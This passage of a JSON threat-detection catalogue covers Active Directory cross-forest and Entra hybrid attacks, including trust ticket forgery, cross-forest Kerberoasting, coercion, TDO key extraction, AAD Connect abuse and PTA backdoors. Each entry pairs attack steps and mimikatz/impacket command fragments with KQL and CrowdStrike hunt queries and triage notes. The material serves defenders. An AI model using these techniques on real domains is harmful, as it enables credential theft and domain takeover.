RID<1000 SIDs by default, but custom high-privilege groups can pass through.","tools":"mimikatz, impacket raiseChild.py/ticketer.py, BloodHound(越境ACL/委任の探索)","detect":"Monitor for users from the trusting forest authenticating with rights equivalent to high-privilege groups in the trusted forest. Watch 4769/4662 for use of tokens with SID History and changes to TDO attributes (msDS-TrustForestTrustInfo).","events":"4769, 4662, 4670, 4716(トラスト情報変更), 4706/4707(トラスト作成/削除), 5136(TDO属性変更)","mitigate":"Enforce SID filtering with `netdom trust /Quarantine:yes`, do not set EnableSIDHistory to yes, apply Selective Authentication, and inventory cross-boundary high-RID group delegations.","triage":"On the trusting-forest DC inspect 4769/4662 for a trusted-forest user authenticating or accessing the directory with high-privilege-group rights, and for use of a SID-History token carrying a custom high-priv group SID with RID>1000. Correlate changes to the TDO attribute msDS-TrustForestTrustInfo (5136), trust changes 4716/4717 equivalent to netdom trust /EnableSIDHistory:yes, and right assignments (4670); a foreign principal reaching privileged actions quickly is black, and forged-ticket artifacts (mimikatz/impacket ticketer) on the source confirm it. Planned SID History enablement during a legitimate forest merger/migration that maps to change control and ADMT is benign.","hunt":[{"plat":"Sentinel","t":"Trust-relationship changes (4716/4717) or protected-object ACL edits (4670); groundwork to disable SID filtering is black, planned trust reconfig is white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4716,4717,4670)\n| project TimeGenerated, Computer, EventID, Activity, SubjectUserName, SubjectDomainName, ObjectName, TargetUserName, Properties\n| sort by TimeGenerated desc"},{"plat":"MDI","t":"Directory ops on trust config (e.g. msDS-TrustForestTrustInfo); SID-filter-bypass tampering is black, legit forest-trust operations are white.","q":"IdentityDirectoryEvents\n| where Timestamp > ago(1d)\n| where ActionType has \"trust\" or AdditionalFields has \"TrustForestTrustInfo\" or AdditionalFields has \"SIDFiltering\"  // confirm ActionType in your tenant\n| project Timestamp, ActionType, AccountName, AccountDomain, TargetDeviceName, DestinationDeviceName, IPAddress, AdditionalFields"}],"huntcs":[{"plat":"LogScale","t":"Cross-forest golden with /sids= carrying target-forest -519/-516/-518 high-priv SIDs = SID-filter bypass = malicious","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/\\/sids=.*S-1-5-21-.*-(519|516|518|512)/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Identity Protection","t":"TDO attribute change and cross-forest SID-History token use (4769/4662) are DC-side — detect via Identity Protection","q":"// Falcon Identity Protection detection: cross-forest SID History / SID filtering bypass (4662 DS-Access + TDO msDS-TrustForestTrustInfo change are DC-only)"}]},{"name":"Trust Ticket / Inter-realm TGT Forgery (Forged Trust Ticket)","aka":"Forged trust ticket, inter-realm key abuse, trust key golden ticket","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1558, T1550","cve":"","sev":"Critical","summary":"Use a domain trust's shared key (trust key) to forge a referral TGT (inter-realm TGT) to the trusted domain and traverse into it.","how":"Prerequisite: obtain the trust account's NTLM hash/AES key (the TDO shared key) from a DC (lsadump::trust /patch or ntds). Use this key to forge a referral TGT (sname=krbtgt/TARGET.DOMAIN), request a TGS from the target KDC, and obtain a service ticket. Can be combined with SID History for escalation.","tools":"mimikatz `lsadump::trust /patch`, `kerberos::golden /service:krbtgt /target:parent.local /rc4:<trustkey>`, Rubeus, impacket","detect":"Watch for inter-realm TGS appearing without an accompanying normal user logon, anomalous use of the trust account name (DOMAIN$), and cross-boundary TGS over RC4. In 4769, look for patterns where Service Name is krbtgt and the Realm crosses boundaries.","events":"4769, 4768, 4776","mitigate":"Do not disable trust password auto-update (default 30 days), protect DC/LSASS at Tier0, use Selective Authentication, and protect the source of the trust key (DC LSA/NTDS).","triage":"On the DC pull 4769 where Service Name is krbtgt and the Realm crosses domains (inter-realm TGS), and flag appearances lacking a normal user logon (4768/4776), abnormal use of the trust account (DOMAIN$), and cross-realm TGS over RC4. If preceded by TDO shared-key theft on a DC (lsadump::trust /patch or secretsdump, seen as Sysmon EID10 LSASS access and 4662 DS-Replication) and a forged referral TGT (sname=krbtgt/TARGET.DOMAIN) is presented to the peer KDC, it is black; an unexpected source host, off-hours, single etype leans black. Legitimate cross-trust service traffic with AES etype and normal bidirectional 4768 authentication is benign.","hunt":[{"plat":"Sentinel","t":"Inter-realm referral tickets (ServiceName krbtgt/otherdomain) issued with RC4 (0x17) in 4769; a forged trust ticket is black, AES cross-realm referral is white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where ServiceName has \"krbtgt\"\n| where TicketEncryptionType == \"0x17\"\n| summarize count() by TargetUserName, ServiceName, TargetDomainName, IpAddress, Computer\n| sort by count_ desc"},{"plat":"Sentinel","t":"Anomalous NTLM credential validation (4776) for trust/machine ($) accounts; trust-key abuse setup is black, known trust-DC validation is white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4776\n| where TargetUserName endswith \"$\"\n| summarize count() by Computer, TargetUserName, WorkstationName, Status\n| where count_ > 0\n| sort by count_ desc"}],"huntcs":[{"plat":"Event Search","t":"mimikatz kerberos::golden /service=krbtgt /target=<trusted> forging an inter-realm trust ticket = malicious / /target= absent in legit use","q":"event_simpleName=ProcessRollup2 CommandLine=\"*/service=krbtgt*\" (CommandLine=\"*/target=*\" OR CommandLine=\"*/rc4*\" OR CommandLine=\"*golden*\" OR CommandLine=\"*/ticket*\")\n| stats count by ComputerName, UserName, ParentBaseFileName, FileName, CommandLine\n| sort - count"}]},{"name":"Cross-forest Kerberoasting","aka":"Cross-trust Kerberoasting","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1558.003","cve":"","sev":"High","summary":"Request TGS for SPN-registered accounts in the target forest across a trust and offline-crack weak service account passwords.","how":"Prerequisite: valid user credentials in one domain and the ability to perform Kerberos authentication to the target domain over the trust. Enumerate the target forest's SPNs (GetUserSPNs -target-domain), request RC4 TGS to extract hashes, and crack with Hashcat.","tools":"impacket `GetUserSPNs.py -target-domain`, Rubeus `kerberoast /domain:trusted.local`, PowerView, Hashcat","detect":"Watch for a surge of cross-boundary TGS requests, RC4 (0x17) requests, and a single principal requesting TGS for many SPNs. Correlate 4769 encryption type with Service Name.","events":"4769","mitigate":"Convert service accounts to gMSA, use 25+ character complex passwords, enforce AES, restrict cross-boundary Kerberos with Selective Authentication, and inventory SPNs.","triage":"On the trusting-side DC pull 4769 with Service Name (the peer forest's SPN) and Ticket Encryption Type=0x17 (RC4), and look for a cross-forest burst where a single principal requests TGS for many SPNs in a short window. Source-host Sysmon EID1 showing impacket GetUserSPNs (-target-domain)/Rubeus kerberoast (/domain:)/PowerView followed by Hashcat is black; SPNs the principal never normally touches plus explicit RC4 (AES suppressed) leans black. A monitoring/asset tool or single business app steadily requesting TGS for specific SPNs over AES (0x12), with stable volume during business hours, is benign.","hunt":[{"plat":"Sentinel","t":"One principal from a foreign source requesting RC4 (0x17) TGS (4769) for many SPNs; cross-forest Kerberoasting is black, single-SPN normal use is white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where TicketEncryptionType == \"0x17\"\n| where ServiceName != \"krbtgt\" and ServiceName !endswith \"$\"\n| summarize distinctSPNs=dcount(ServiceName), tickets=count(), doms=dcount(TargetDomainName) by TargetUserName, IpAddress\n| where distinctSPNs > 5"}],"huntcs":[{"plat":"Event Search","t":"Rubeus kerberoast /domain: or Impacket GetUserSPNs -target-domain requesting cross-forest SPNs (RC4) = malicious","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*kerberoast*\" OR CommandLine=\"*GetUserSPNs*\") (CommandLine=\"*-target-domain*\" OR CommandLine=\"*/domain:*\" OR CommandLine=\"*/rc4opsec*\" OR CommandLine=\"*-request*\")\n| stats count by ComputerName, UserName, ParentBaseFileName, FileName, CommandLine\n| sort - count"}]},{"name":"Cross-forest / Cross-domain Delegation Abuse (Unconstrained/Constrained/RBCD)","aka":"Trust delegation abuse, TrustedToAuthForDelegation over trust","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1558, T1134","cve":"CVE-2020-0665","sev":"High","summary":"Abuse delegation configurations (unconstrained/constrained/resource-based constrained delegation) across a trust to impersonate high-privilege principals cross-boundary.","how":"Prerequisite: control a host with delegation configured, or an ACL that can write RBCD. Coerce a DC etc. to authenticate to an unconstrained delegation host and capture its TGT, or reach a cross-boundary service via constrained delegation (S4U2Proxy). Cross-forest, cross-boundary TGT delegation is disabled by default via the TDO trustAttributes (CROSS_ORGANIZATION_NO_TGT_DELEGATION), but can pass through when explicitly enabled via netdom trust /EnableTGTDelegation:Yes etc. (no attribute named msDS-EnableUnconstrainedDelegation exists).","tools":"Rubeus `s4u`/`monitor`, impacket `getST.py`, krbrelayx, PowerView(委任列挙), mimikatz","detect":"Monitor DC account authentication to unconstrained delegation hosts, anomalous S4U2Self/S4U2Proxy, and cross-boundary Forwardable TGT delegation. Watch the Transited/delegation flags in 4769.","events":"4769, 4768, 4624","mitigate":"Eliminate unconstrained delegation, set sensitive accounts to \"Account is sensitive and cannot be delegated\"/Protected Users, keep cross-forest TGT delegation disabled (default), and audit RBCD write ACLs.","triage":"On the DC inspect 4769 Transited/Forwardable delegation flags, S4U2Self/S4U2Proxy patterns, and cross-forest forwardable-TGT delegation, and correlate 4624 where a DC account (DC$) authenticates to an unconstrained-delegation host. For RBCD, check 5136 writes to msDS-AllowedToActOnBehalfOfOtherIdentity and the writing Subject; source Sysmon EID1 showing Rubeus s4u/monitor, impacket getST, or krbrelayx is black. Cross-forest TGT delegation right after explicitly clearing the TDO CROSS_ORGANIZATION_NO_TGT_DELEGATION (netdom /EnableTGTDelegation:Yes) leans black. A legitimate app's configured constrained delegation doing S4U2Proxy to its allowed services over AES as steady behavior is benign.","hunt":[{"plat":"Sentinel","t":"Machine-account TGS (4769) carrying S4U Transited Services; constrained-delegation/RBCD abuse is black, configured delegation service normal use is white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where Properties has \"Transited Services\" or TicketOptions has \"0x40800000\"\n| where TargetUserName endswith \"$\"\n| summarize count() by TargetUserName, ServiceName, IpAddress, Computer\n| sort by count_ desc"},{"plat":"Sentinel","t":"DC machine account ($) network logon (4624 Type 3) to a non-DC host; TGT capture via unconstrained delegation is black, DC-to-DC replication auth is white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624 and LogonType == 3\n| where TargetUserName endswith \"$\"\n| where TargetUserName has_any (\"DC\",\"ADC\",\"PDC\")\n| summarize count() by Computer, TargetUserName, IpAddress, WorkstationName\n| sort by count_ desc"}],"huntcs":[{"plat":"Event Search","t":"Rubeus s4u /impersonateuser /msdsspn abusing cross-domain S4U2Self/Proxy delegation = malicious / legit service delegation leaves no s4u tool trace","q":"event_simpleName=ProcessRollup2 CommandLine=\"*s4u*\" (CommandLine=\"*/impersonateuser*\" OR CommandLine=\"*/msdsspn*\" OR CommandLine=\"*/self*\" OR CommandLine=\"*/altservice*\")\n| stats count by ComputerName, UserName, ParentBaseFileName, FileName, CommandLine\n| sort - count"},{"plat":"Identity Protection","t":"DC-account auth to unconstrained-delegation hosts and cross-trust forwardable-TGT delegation (4769 flags) are DC-side — via Identity Protection","q":"// Falcon Identity Protection detection: unconstrained/constrained/RBCD delegation abuse over trust (4769 delegation flags are DC-only)"}]},{"name":"Coercion over Trust (PrinterBug / PetitPotam / DFSCoerce / ShadowCoerce)","aka":"MS-RPRN, MS-EFSRPC, MS-DFSNM, MS-FSRVP coercion across trust","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1187","cve":"CVE-2021-36942","sev":"High","summary":"Coerce authentication from a target-domain machine (especially a DC) across a trust, and combine with NTLM relay or unconstrained delegation for cross-boundary credential theft and escalation.","how":"Prerequisite: network reachability to the target-domain machine with RPC allowed. Induce DC$ authentication via Spooler's RpcRemoteFindFirstPrinterChangeNotification (PrinterBug), EfsRpcOpenFileRaw (PetitPotam), or NetrDfsRemoveStdRoot (DFSCoerce), then relay to ADCS (ESC8) or LDAP, or capture it on an unconstrained delegation host.","tools":"printerbug.py, PetitPotam.py, dfscoerce.py, coercer, ntlmrelayx, krbrelayx","detect":"Watch for MS-RPRN/MS-EFSRPC/MS-DFSNM RPC calls from across the boundary, external authentication by DC accounts, and anomalous NTLM authentication to ADCS Web Enroll.","events":"4624/4625(NTLM), 5145(RPCオブジェクトアクセス), ADCS 4886/4887","mitigate":"Enforce EPA (Extended Protection) and SMB/LDAP signing, disable the Spooler service, disable NTLM on ADCS Web Enroll, filter RPC at trust boundaries, and use Selective Authentication.","triage":"On the target machine/DC pull 5145 RPC object access (RelativeTargetName spoolss/efsrpc/netdfs; MS-RPRN/MS-EFSRPC/MS-DFSNM) and correlate a cross-trust source call with an immediate DC-account (DC$) 4624/4625 (NTLM) to an external/relay destination. For ADCS (ESC8), CA 4886/4887 showing an abnormal cert request/issuance in the DC$ name, plus source Sysmon EID3 connections to ntlmrelayx/krbrelayx and EID1 PetitPotam.py/printerbug.py/dfscoerce.py/coercer, is black; coercion chaining to a relay or cert within seconds confirms it. A vuln scanner (Nessus/Qualys) or monitoring server periodically probing the same RPC from a known host in business hours with no NTLM relay endpoint is benign.","hunt":[{"plat":"Sentinel","t":"Access (5145) to coercion RPC pipes on IPC$ (spoolss/efsrpc/netdfs/fssagentrpc); PetitPotam-style coercion is black, legit print/EFS RPC is white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where ShareName has \"IPC$\"\n| where RelativeTargetName in~ (\"spoolss\",\"efsrpc\",\"efsr\",\"netdfs\",\"fssagentrpc\",\"lsarpc\")\n| summarize count(), pipes=make_set(RelativeTargetName,6) by Computer, SubjectUserName, IpAddress\n| sort by count_ desc"},{"plat":"MDI","t":"Spike in NTLM logons by machine ($) accounts from foreign sources; coercion-to-relay traces are black, known-host NTLM fallback is white.","q":"IdentityLogonEvents\n| where Timestamp > ago(1d)\n| where Protocol == \"Ntlm\"\n| where AccountName endswith \"$\"\n| summarize count(), targets=dcount(TargetDeviceName) by AccountName, DeviceName, IPAddress\n| where count_ > 0\n| sort by count_ desc"}],"huntcs":[{"plat":"Event Search","t":"PetitPotam/DFSCoerce/PrinterBug coercion tool execution = malicious / those tool names never in legit ops","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*PetitPotam*\" OR CommandLine=\"*DFSCoerce*\" OR CommandLine=\"*Coercer*\" OR CommandLine=\"*ShadowCoerce*\" OR CommandLine=\"*efsrpc*\" OR CommandLine=\"*MS-RPRN*\" OR FileName=\"*Coerce*\")\n| stats count by ComputerName, UserName, ParentBaseFileName, FileName, CommandLine\n| sort - count"},{"plat":"Event Search","t":"One host fanning 135/445 RPC to multiple DCs = coercion = malicious / admin tool steady single-DC connect = benign","q":"event_simpleName=NetworkConnectIP4 (RemotePort=135 OR RemotePort=445)\n| stats dc(RemoteAddressIP4) as dcTargets by aid, ComputerName, ContextBaseFileName\n| where dcTargets >= 2"}]},{"name":"Foreign Security Principal / Foreign Group Membership Abuse","aka":"FSP abuse, cross-forest group membership","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1078.002","cve":"","sev":"High","summary":"Abuse configurations where a user/group from another forest is added as an FSP to a local domain's privileged group (e.g., Administrators, DnsAdmins) for cross-boundary escalation.","how":"Prerequisite: control a principal in one forest. Use BloodHound to explore cross-boundary group memberships/ACLs (GenericAll, WriteDacl, etc.) and find/use a path where you effectively belong to a high-privilege group via an FSP.","tools":"BloodHound/SharpHound(--CollectAllProperties, trust収集), PowerView `Get-DomainForeignGroupMember`","detect":"Monitor use of privileged groups by cross-boundary principals, changes to FSP objects (CN=ForeignSecurityPrincipals), and cross-boundary ACL grants.","events":"4732/4733(ドメインローカル追加/削除=FSPの主経路), 4728/4729(グローバル), 4756/4757(ユニバーサル), 5136(ディレクトリ変更)","mitigate":"Periodically inventory cross-boundary group memberships and ACLs, apply least privilege, control cross-boundary additions to domain local groups, and use Selective Authentication.","triage":"On the DC pull 4728/4729/4756/4757 (global/domain-local/universal group member changes) and 5136 (changes under CN=ForeignSecurityPrincipals or cross-forest ACLs), and check whether the added Member is a foreign principal (another forest's SID) joining a privileged group, plus the acting Subject. BloodHound/SharpHound (--CollectAllProperties, trust collection) or PowerView Get-DomainForeignGroupMember in source Sysmon EID1, followed by the foreign principal authenticating (4624) with privileged rights, is black. Legitimate cross-forest collaboration that deliberately adds a delegated external admin via FSP, mapping to change control and performed by a known admin in business hours, is benign.","hunt":[{"plat":"Sentinel","t":"Adding a ForeignSecurityPrincipal member to a privileged group (4728/4756); cross-forest privilege grant is black, deliberate trusted-user add is white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4728,4756)\n| where MemberName has \"ForeignSecurityPrincipals\" or MemberName has \"CN=S-1-5-21\"\n| project TimeGenerated, Computer, EventID, SubjectUserName, TargetUserName, MemberName, MemberSid\n| sort by TimeGenerated desc"},{"plat":"Sentinel","t":"Changes (5136) to objects under CN=ForeignSecurityPrincipals; cross-forest ACL/FSP injection is black, trust-setup provisioning is white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where ObjectName has \"ForeignSecurityPrincipals\"\n| project TimeGenerated, Computer, SubjectUserName, SubjectDomainName, ObjectName, OperationType, Properties\n| sort by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"net group/Add-DomainGroupMember adding a foreign principal to a privileged group = malicious / planned IT membership change = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*Add-DomainGroupMember*\" OR CommandLine=\"*Add-ADGroupMember*\" OR CommandLine=\"*net group*\" OR CommandLine=\"*net localgroup*\") (CommandLine=\"*Enterprise Admins*\" OR CommandLine=\"*Domain Admins*\" OR CommandLine=\"*Administrators*\" OR CommandLine=\"*/add*\")\n| stats count by ComputerName, UserName, ParentBaseFileName, FileName, CommandLine\n| sort - count"}]},{"name":"Trust Account / TDO Password Extraction","aka":"Trust key dump, TDO secret extraction","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1552, T1003","cve":"","sev":"High","summary":"Extract the Trusted Domain Object (TDO) shared key from a compromised DC to serve as the foundation for Trust Ticket forgery and NTLM validation.","how":"Prerequisite: admin access to LSA/NTDS on a DC. Use lsadump::trust /patch or secretsdump.py to obtain the current/old NTLM and AES keys of the trust account (DOMAIN$) and use them for Forged Trust Tickets.","tools":"mimikatz `lsadump::trust /patch`, impacket `secretsdump.py`, `lsadump::lsa`","detect":"Watch for LSASS/NTDS access on DCs, anomalous DRSUAPI, and subsequent cross-boundary TGS tied to the trust key.","events":"4662(DS-Replication), 4769, Sysmon 10(LSASSアクセス)","mitigate":"Credential Guard/LSA protection, Tier0 isolation, minimizing admin access to DCs, and maintaining trust password auto-update.","triage":"On the DC pull 4662 for access to the DS-Replication-Get-Changes(-All) property GUIDs with its Subject, and Sysmon EID10 for a suspicious process opening lsass.exe (mimikatz/secretsdump) via GrantedAccess, to spot TDO/trust-account key theft. If a cross-realm TGS tied to that key appears immediately after (4769 Service Name=krbtgt with a crossing Realm, RC4), it is black; an unexpected non-interactive source host with anomalous DRSUAPI (a burst of replication requests) confirms it. Normal DC-to-DC replication (routine 4662 by DC$/Enterprise Domain Controllers) or a backup product running as a known account in business hours with no direct LSASS access is benign.","hunt":[{"plat":"Sentinel","t":"Non-machine account touching DS-Replication-Get-Changes GUIDs (4662); DCSync trust/krbtgt key extraction is black, DC$ replication is white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where Properties has_any (\"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\",\"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\",\"89e95b76-444d-4c62-991a-0facbeda640c\")\n| where SubjectUserName !endswith \"$\"\n| project TimeGenerated, Computer, SubjectUserName, SubjectDomainName, ObjectName, Properties"},{"plat":"MDE","t":"Process access / credential theft against LSASS on the DC (OpenProcessApiCall/ASR Lsass); NTDS/trust-key dumping is black, EDR/backup access is white.","q":"DeviceEvents\n| where Timestamp > ago(1d)\n| where ActionType in (\"OpenProcessApiCall\",\"AsrLsassCredentialTheftAudited\",\"AsrLsassCredentialTheftBlocked\")\n| where FileName =~ \"lsass.exe\" or AdditionalFields has \"lsass\"\n| where InitiatingProcessFileName !in~ (\"MsMpEng.exe\",\"MsSense.exe\",\"csrss.exe\")\n| project Timestamp, DeviceName, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName"}],"huntcs":[{"plat":"Event Search","t":"mimikatz lsadump::trust /patch or secretsdump extracting trust keys/NTDS = malicious / no such command in legit DC maintenance","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*lsadump::trust*\" OR CommandLine=\"*lsadump::lsa*\" OR CommandLine=\"*lsadump::dcsync*\" OR CommandLine=\"*secretsdump*\" OR CommandLine=\"*/patch*\")\n| stats count by ComputerName, UserName, ParentBaseFileName, FileName, CommandLine\n| sort - count"},{"plat":"Identity Protection","t":"DRSUAPI replication / DCSync trust-key theft (4662 DS-Replication) is DC-side — detect via Identity Protection","q":"// Falcon Identity Protection detection: DCSync / DRSUAPI replication of trust (TDO) secrets (GetNCChanges 4662 is DC-only)"}]},{"name":"Azure AD Connect Sync Account Abuse (DCSync / credential theft)","aka":"AAD Connect MSOL_ account abuse, ADSync credential extraction","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1003.006, T1078.004","cve":"","sev":"Critical","summary":"Compromise the AAD Connect server or service account (MSOL_) that syncs on-prem to Entra to steal DCSync rights or high-privilege cloud credentials.","how":"Prerequisite: admin access to the AAD Connect server. Decrypt the sync account credentials from ADSync's SQL/DPAPI (MSOL_ holds DCSync=DS-Replication rights). Use this for on-prem DCSync, or use the Global Admin-equivalent Connector credentials for Entra operations.","tools":"AADInternals `Get-AADIntSyncCredentials`, adconnectdump, mimikatz(DPAPI), impacket secretsdump","detect":"Watch for DCSync by the MSOL_ account from unexpected hosts, anomalous processes on the AAD Connect server, and anomalous API use by the Connector account.","events":"4662(Replication Get Changes), 4624(MSOL_の異常元), Entra監査ログ","mitigate":"Treat the AAD Connect server as Tier0, minimize MSOL_ privileges, strictly protect the sync account, monitor Entra privileged roles, and consider disabling Password Writeback.","triage":"On the DC pull 4662 for MSOL_ account access to DS-Replication-Get-Changes-All (Replication) and check 4624 source to see whether MSOL_ logged on from any host other than the AAD Connect server. AAD Connect server Sysmon EID1 showing AADInternals(Get-AADIntSyncCredentials)/adconnectdump/mimikatz(DPAPI)/secretsdump or access to the ADSync SQL/DPAPI store, followed by on-prem DCSync or Entra audit logs showing anomalous Connector API use (directory changes from an unexpected IP/app), is black. Normally MSOL_ replication originates only from the AAD Connect server on a fixed cycle, so any other source, a sudden bulk change, or an interactive logon leans black. Steady-state sync only, sourced from the AAD Connect server with no anomalous Entra audit activity, is benign.","hunt":[{"plat":"Sentinel","t":"DCSync replication rights exercised by the sync account (MSOL_/AAD_) = black / normal DC-to-DC replication = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where Properties has \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\" or Properties has \"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\"\n| where SubjectUserName startswith \"MSOL_\" or SubjectUserName startswith \"AAD_\" or SubjectUserName startswith \"Sync_\"\n| summarize hits=count(), dcs=make_set(Computer) by SubjectUserName, bin(TimeGenerated, 1h)\n| where hits > 0"},{"plat":"MDI","t":"Sync account performing directory replication from a host/IP other than the AAD Connect server = black / only the known sync server = white","q":"IdentityDirectoryEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"Directory Services replication\"\n| where AccountName startswith \"MSOL_\" or AccountName startswith \"Sync_\" or AccountName startswith \"AAD_\"\n| summarize repls=count(), srcHosts=make_set(DeviceName), srcIPs=make_set(IPAddress) by AccountName\n| where array_length(srcIPs) > 1 or srcHosts has \"WORKSTATION\""}],"huntcs":[{"plat":"Event Search","t":"Surfaces DCSync/replication tooling on the attacker host; secretsdump/lsadump::dcsync from a non-DC workstation = black.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*lsadump::dcsync*\" OR CommandLine=\"*dcsync*\" OR CommandLine=\"*secretsdump*\" OR CommandLine=\"*drsuapi*\" OR CommandLine=\"*GetNCChanges*\")\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"},{"plat":"Event Search","t":"MSOL_ sync-account logons; MSOL_ authenticating on any host other than the AAD Connect server or from an unexpected IP = black.","q":"event_simpleName=UserLogon UserName=\"MSOL_*\"\n| stats dc(ComputerName) as hosts count by UserName, ComputerName, RemoteAddressIP4, LogonType\n| sort - count"}]},{"name":"Password Hash Sync (PHS) Abuse","aka":"PHS hash injection, cloud golden ticket precursor","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1556, T1078.004","cve":"","sev":"High","summary":"Abuses the PHS mechanism that syncs an on-prem password-hash-derived value into Entra, letting an on-prem compromise take over cloud accounts, or forging cloud auth via hash injection.","how":"Prereq: compromise of AAD Connect/DC. Compromise the AAD Connect (ADSync) server to extract the sync service account credentials, or abuse the sync pipeline. AADInternals can set any user's cloud-side password (PBKDF2-derived hash), enabling a valid sign-in to the cloud. Note: PHS syncs a derived hash, not the raw NTLM hash, so Pass-the-Hash-style cloud auth presenting an NTLM hash is not possible.","tools":"AADInternals `Set-AADIntUserPassword`/PHS関連関数, mimikatz","detect":"Anomalous password updates via PHS, unexpected sync events, suspicious cloud-side sign-ins.","events":"Entra監査/サインインログ, 4662","mitigate":"Protect AAD Connect, Conditional Access + MFA, risk-based sign-in, least-privilege sync account.","triage":"On the AAD Connect (ADSync) host, check 4688/Sysmon EID1 for AADInternals, PowerShell or mimikatz execution, and DC 4662 replication reads (DS-Replication-Get-Changes GUIDs 1131f6aa/1131f6ad) by the ADSync service account (MSOL_*). It is malicious if that chains, for the same user, to an Entra sign-in log success from an unexpected IP/device plus an audit-log 'Set Password' outside the sync schedule and not from the AAD Connect host. It is benign for legitimate initial sync, password write-back or a planned full sync when the source is the genuine AAD Connect host with the known ADSync account during maintenance windows and no suspicious Entra sign-in follows.","hunt":[{"plat":"Sentinel","t":"Password update/reset in audit initiated by the sync service account = PHS abuse black / normal sync engine activity does not surface here = white","q":"AuditLogs\n| where TimeGenerated > ago(7d)\n| where Category =~ \"UserManagement\"\n| where OperationName has_any (\"Reset user password\", \"Update user\", \"Change user password\")\n| extend actor = tostring(InitiatedBy.user.userPrincipalName)\n| where actor has \"Sync_\" or actor startswith \"On-Premises Directory Synchronization\"\n| project TimeGenerated, OperationName, actor, Result, target = tostring(TargetResources[0].userPrincipalName)"},{"plat":"Entra","t":"PHS-synced user signing into cloud successfully from a foreign IP / new device with no matching on-prem auth = black / sign-in from usual location = white","q":"AADSignInEventsBeta\n| where Timestamp > ago(1d)\n| where ErrorCode == 0\n| where ClientAppUsed !in (\"Browser\", \"Mobile Apps and Desktop clients\")\n| summarize signins=count(), countries=make_set(Country), ips=make_set(IPAddress) by AccountUpn, bin(Timestamp, 1h)\n| where array_length(countries) > 1"}],"huntcs":[{"plat":"Event Search","t":"PHS-abuse tooling on the AAD Connect server; AADInternals sync-credential/password cmdlets = black.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*AADInternals*\" OR CommandLine=\"*Get-AADIntSyncCredentials*\" OR CommandLine=\"*Set-AADIntUserPassword*\" OR CommandLine=\"*ADSync*\" OR CommandLine=\"*mcrypt*\")\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"},{"plat":"Identity Protection","t":"PHS hash-injection / anomalous sync is a DC/Entra-side event; correlate with Falcon Identity Protection, no EDR hunt query.","q":"// Falcon Identity Protection detection: anomalous Password Hash Sync / credential update — pivot to AAD Connect server host process (see query above)"}]},{"name":"Pass-Through Authentication (PTA) Agent Backdoor","aka":"PTA agent injection, PTASpy, Skeleton Key for cloud","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1556.007","cve":"","sev":"Critical","summary":"Injects a DLL into the PTA authentication agent to allow auth success with any password and steal plaintext credentials — a cloud auth backdoor.","how":"Prereq: admin access to the server running the PTA agent (typically the AAD Connect host). Use PTASpy or similar to hook the agent process, letting all users sign in with any password while harvesting plaintext passwords.","tools":"AADInternals `Install-AADIntPTASpy`, `Get-AADIntPTASpyLog`","detect":"Suspicious DLL/process injection on the PTA agent host, on-prem auth uncorrelated with successful sign-ins, abnormal agent restarts.","events":"Entraサインインログ, Sysmon 7/8(DLL/CreateRemoteThread), 4688","mitigate":"Isolate PTA host in Tier0, app control/EDR, Conditional Access + MFA, reconsider PTA in favor of PHS or federation, monitor agent integrity.","triage":"On the PTA agent host (usually AAD Connect), inspect Sysmon EID8 (CreateRemoteThread)/EID7 (Image Load) for unsigned DLL injection into AzureADConnectAuthenticationAgentService.exe (PTASpy), alongside 4688 showing Install-AADIntPTASpy. It is malicious when an abnormal agent restart (7036/7045) and Entra sign-in-log 'PTA success' with no matching on-prem 4776/4768 line up on the same host and time. It is benign when a signed module update from a Microsoft/agent reinstall or patch explains it, the DLL is validly signed, and it matches IT maintenance records.","hunt":[{"plat":"MDE","t":"PTA auth agent loading a DLL from Temp/user path = PTASpy injection black / only signed DLLs under Program Files = white","q":"DeviceImageLoadEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName =~ \"AzureADConnectAuthenticationAgentService.exe\"\n| where FolderPath has_any (\"\\\\Temp\\\\\", \"\\\\Users\\\\\", \"\\\\ProgramData\\\\\", \"\\\\Windows\\\\Temp\\\\\", \"\\\\AppData\\\\\")\n| project Timestamp, DeviceName, FileName, FolderPath, SHA256, 